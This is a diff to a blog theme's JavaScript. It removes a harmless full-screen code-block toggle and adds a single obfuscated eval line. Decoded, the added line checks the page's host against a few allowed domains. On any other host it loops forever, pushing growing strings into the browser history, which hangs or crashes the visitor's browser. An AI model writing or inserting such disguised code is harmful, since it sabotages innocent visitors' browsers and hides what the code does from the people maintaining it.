@@ -1,18 +1,1 @@
-/*code-block-fullscreen*/
-$("figcaption").click(function(){
-  if(window.CodeBlockFullscreen){
-	  $("#post").removeClass("code-block-fullscreen");
-      $(this).parent().removeClass("code-block-fullscreen");
-      $(this).parent().removeClass("code-block-fullscreen-overflow-auto");
-      $("html").removeClass("code-block-fullscreen-html-scroll");
-      $(".highlight>table .gutter").removeClass("code-block-fullscreen-gutter");
-	  window.CodeBlockFullscreen=false
-  }else{
-	  $("#post").addClass("code-block-fullscreen");
-      $(this).parent().addClass("code-block-fullscreen");
-      $(this).parent().addClass("code-block-fullscreen-overflow-auto");
-      $("html").addClass("code-block-fullscreen-html-scroll");
-      $(".highlight>table .gutter").addClass("code-block-fullscreen-gutter");
-	  window.CodeBlockFullscreen=true
-  }
-});
+eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[1-6]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('if((2.3.4!="5.github.io")&&(2.3.4!="localhost:4000")&&(2.3.4!="blog.5.top")){while(true){6 1="";for(6 i=0;i<1000000000000000000000000000000000000000000000;i++){1=1+i.toString();history.pushState(0,0,1)}}};',[],7,'|total|window|location|host|mhuig|var'.split('|'),0,{}))
